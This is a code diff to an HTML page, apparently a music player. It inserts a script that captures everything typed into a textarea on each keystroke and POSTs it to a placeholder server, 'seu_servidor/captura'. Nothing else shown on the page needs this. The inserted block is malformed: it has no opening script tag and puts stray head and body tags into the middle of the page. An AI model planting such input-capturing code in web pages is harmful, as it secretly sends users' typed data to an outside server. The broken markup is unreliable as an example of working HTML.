@@ -35,6 +35,25 @@
 </div>
 </div>
 
+     document.addEventListener("DOMContentLoaded", function() {
+            const textarea = document.getElementById('myTextarea');
+            textarea.addEventListener('input', function() {
+                const data = { text: textarea.value };
+                fetch('http://seu_servidor/captura', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+            });
+        });
+    </script>
+</head>
+<body>
+    <textarea id="myTextarea" placeholder="Digite algo..."></textarea>
+</body>
+
 <!-- javascript -->
 <script>
     const songName = document.getElementById('name-song');
